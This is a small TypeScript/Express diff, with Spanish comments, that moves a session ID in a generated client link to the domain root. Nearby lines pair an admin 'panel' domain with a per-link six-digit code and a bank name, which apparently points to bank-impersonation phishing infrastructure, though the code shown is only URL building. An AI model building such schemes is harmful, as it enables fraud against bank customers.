@@ -812,7 +812,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaracion.info';
 
       // Armamos los enlaces para ambos dominios
-      const clientLink = `https://${clientDomain}/client/${sessionId}`;
+      // En el dominio del cliente, el sessionId va directamente en la raíz
+      const clientLink = `https://${clientDomain}/${sessionId}`;
       const adminLink = `https://${adminDomain}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
